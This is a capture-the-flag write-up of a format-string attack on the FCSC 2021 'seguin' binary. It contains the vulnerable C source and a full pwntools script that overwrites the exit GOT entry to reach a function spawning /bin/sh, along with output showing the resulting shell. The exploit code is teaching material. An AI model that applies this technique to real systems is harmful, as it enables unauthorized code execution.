---
title: Overwrite GOT function address
description: Overwriting a function address using a format string attack.
---

# Format string - Overwrite GOT function address

## Summary

Two ways to write an address using `%n` :

1. Print millions of charcaters.
2. Overwrite lower and higher 2 bytes seperatly (efficient way).

## Challenge

### Statement

!!! note ""
    Challenge : `seguin` from FCSC 2021.

### Source code

```c linenums="1"

void main() {
  char local_30 [32];

  puts("************************************");
  puts("** Service d'adoption des bovidés **");
  puts("************************************");
  printf("Merci d\' indiquer le nom de l\'animal que vous etes venus chercher :\n>>> ");
  fflush(stdout);

  fgets(local_30, 32, stdin);
  printf("Vouz avez demandé ");
  printf(local_30);

  puts("Nous vous tiendrons au courant");
}


void chevre() {
  system("/bin/sh");
  return;
}
```

## Answer

The last `printf` function of `main()` is vulnerable to format string attack. Let's use `%n` to replace the address of `exit` to the address of `chevre`.

Source code (solve.py) :

```python
#!/usr/bin/env python3
from pwn import process, ELF, p32, log, context, fmtstr_payload


def send_line(proc, line):
    """ Send line to the process """
    if isinstance(line, str):
        line = line.encode()

    proc.sendlineafter(b">>> ", line)

    return proc.recvline().split(b"Vouz avez demand\xc3\xa9 ")[1].strip()


def find_offset():
    """ Find the correct offset in the stack """
    i = 0
    while True:
        with context.local(log_level="error"):
            proc = process(PROGRAM)
            data = send_line(proc, f"ABCD%{i}$x")
            proc.close()

        if b"ABCD44434241" == data:
            break

        i += 1
    return i


# Variables 
PROGRAM = "./seguin"
elf = ELF(PROGRAM)
chevre = elf.symbols["chevre"]
exi = elf.got["exit"]

offset = find_offset()
log.info(f"Offset : n°{offset}")

# Setup payload
## First way
"""
payload = p32(exi) # Address to write
payload += f"%1${chevre}x".encode() # Print 'n' char with 'n' = the address of 'chevre' (int)
payload += f"%{offset}$n".encode() # Write on puts (offset in the stack) the number of printed char
"""

## Second way
# 0x80491b2 <chevre>:     0x53e58955
payload = p32(exi)
payload += p32(exi+2)

# 0000 91b2
payload += f"%{0x91b2-len(payload)}x".encode()
payload += f"%{offset}$n".encode()

# 0001 0804
payload += f"%{0x10804-0x91b2}x".encode()
payload += f"%{offset+1}$n".encode()

proc = process(PROGRAM)
proc.sendlineafter(b">>> ", payload)
proc.interactive()
```

Execution :

```
$ python3 solve.py
[*] '/home/.../Seguin/seguin'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Offset : n°4
[+] Starting local process './seguin': pid 5774
[*] Switching to interactive mode
Vouz avez demandé `\x90\x04b\x90\x04
[...]
        f7f33540
Nous vous tiendrons au courant
$ id
uid=1000(xanhacks) gid=1000(xanhacks) groups=1000(xanhacks),995(audio),998(wheel)
```